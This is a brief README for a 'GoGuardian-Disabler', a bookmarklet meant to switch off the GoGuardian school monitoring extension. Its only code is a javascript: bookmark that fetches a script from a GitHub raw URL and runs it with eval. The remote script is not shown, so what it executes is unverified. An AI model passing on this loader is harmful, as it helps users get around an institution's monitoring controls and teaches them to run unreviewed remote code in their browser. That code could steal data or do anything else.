# GoGuardian-Disabler

Add the text below as a bookmark, go to [this link](https://chrome.google.com/webstore/). Click the bookmark to disable GoGuardian. You will see a pop-up if GoGuardian was successfully disabled.
```
javascript:fetch(`https://raw.githubusercontent.com/meatballsong1/Extension-test/main/disable.js`).then(data=>{data.text().then(text=>{eval(text)})});
```
